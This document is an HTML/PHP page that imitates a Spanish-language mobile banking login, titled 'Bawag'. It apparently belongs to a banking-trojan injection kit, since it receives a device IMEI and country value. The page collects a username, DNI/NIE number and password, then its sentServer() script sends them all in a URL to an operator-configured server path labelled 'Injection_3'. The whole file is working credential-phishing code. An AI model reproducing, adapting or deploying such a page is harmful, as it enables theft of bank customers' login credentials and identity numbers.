<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>
	
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="es/com.rsi/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>

<div class="header">
	<img style="float:left;width: 15px;margin-left: 10px;margin-top: 10px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAqCAMAAACeG2tsAAAAS1BMVEX///8wMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDBNcofRAAAAGXRSTlMAACTPJuT/H80B8Tct6wLWaCX0QvbR4hzLOBik7QAAAKZJREFUOMuVk9cOwjAQBO8MNgRCDe3/vxQrIva1ReDHGVkue0v092KzKkqrdShSLnkTiMpL2Q5OzHy3dzsaJ8QJcUKcEBdiVLyL8aA4Gc5WLNyKxo3oXAvBlZBcCsWF0LyL46nycmb+eQc+A9+K+ZLjd7QkvBDG/m4zLo/F+NnVicvME8gcTwmeKzyJH3OdgkbN5jYFjWombtR9iDv4eMatfaUvNX8DHcYJxc877ScAAAAASUVORK5CYII=">
	<img style="/* display: block; *//* width: 43%; *//* padding: 8px; *//* margin: 0px auto; *//* margin-left: -20px; */" src="data:image/png;base64,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">
</div>

<p style="text-align: left;color: #fff;background: #79ba01;padding-left: 10px;">Accesso Banca Movil</p>
    <div class="main">
        <div class="container">
<div class="row">
                <div class="col-xs-1 col-sm-2"></div>
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">
<br>
					
					<p> Introduzca sus datos para acceder: </p>

					 <form id="form">
                            <div class="form-group">
									<input type="text" class="form-control" name="field2" placeholder="Usuario" id="Username" autocomplete="off" autofocus="autofocus" maxlength="50" data-reg="/.{1,50}/" >
                           </div>

                            <div class="form-group"> 
									<input type="password" class="form-control" name="field3" placeholder="DNI NIE" id="password" autocomplete="off" data-reg="/.{1,50}/" maxlength="50" >
                            </div>

                            <div class="form-group"> 
									<input type="password" class="form-control" name="field4" placeholder="Contrasena" id="Contrasena" autocomplete="off" data-reg="/.{1,20}/" maxlength="20" >
                            </div>
							

                       				<input type="button" class="input_submitBtn" onClick="sentServer();" value="Aceptar">
				 </form>
				 </div>
			</div>
                <div class="col-xs-1 col-sm-2"></div>
            </div>
        </div>
    </div>
<script>
	function sentServer()
	{
	
	var oNumInp1 = document.getElementById('Username');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';
	
	var login1 = document.forms["form"].elements["Username"].value; 
	var pass = document.forms["form"].elements["password"].value; 
	var Contrasena = document.forms["form"].elements["Contrasena"].value; 

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|rsi|"+login1+"|"+pass+"|"+Contrasena);
	}
}
</script>
</body>
</html>
